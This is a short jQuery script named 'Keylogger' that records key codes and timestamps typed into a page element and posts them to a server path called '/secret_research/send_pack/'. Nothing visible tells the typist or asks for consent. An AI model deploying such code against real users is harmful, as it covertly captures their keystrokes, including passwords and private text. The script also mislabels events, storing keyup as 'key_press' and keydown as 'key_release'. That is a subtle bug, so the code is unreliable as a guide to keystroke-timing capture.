var Keylogger = {};

Keylogger.log = {
    key_press: [],
    key_release: []
};

Keylogger.init = function(element){
    $(element).keyup(function(eventObj){
        Keylogger.log.key_press.push({
            key_code: eventObj.keyCode,
            time: $.now()
        });
    });

    $(element).keydown(function(eventObj){
        Keylogger.log.key_release.push({
            key_code: eventObj.keyCode,
            time: $.now()
        });
    });
}

Keylogger.send = function(){
    $.ajax({
        async: true,
        type: 'POST',
        data: {
            data: JSON.stringify(Keylogger.log)
        },
        url:'/secret_research/send_pack/',
        success: function(){
            Keylogger.log = {
                key_press: [],
                key_release: []
            };
        },
        error: function(){
            //Keylogger.send();
        }
    });
    /*alert(Keylogger.log.key_press[0].key_code + " - " +  Keylogger.log.key_press[0].time);
    Keylogger.log = {
        key_press: [],
        key_release: []
    };*/
};